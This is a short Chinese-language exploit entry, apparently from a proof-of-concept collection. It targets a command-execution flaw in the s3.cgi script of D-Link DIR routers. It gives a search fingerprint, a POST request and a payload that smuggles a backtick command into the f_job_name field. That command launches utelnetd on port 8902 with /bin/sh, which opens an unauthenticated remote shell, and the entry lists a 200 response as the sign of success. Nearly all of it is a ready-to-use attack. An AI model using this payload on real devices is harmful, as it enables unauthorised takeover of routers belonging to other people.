# D-Links3.cgi存在命令执行漏洞

D-Links3.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/s3.cgi HTTP/1.1`

**Payload**
```
cmd=cgi\_s3\_backup\&f\_job\_name=`utelnetd -p 8902 -l /bin/sh`
```
- **响应特征**：200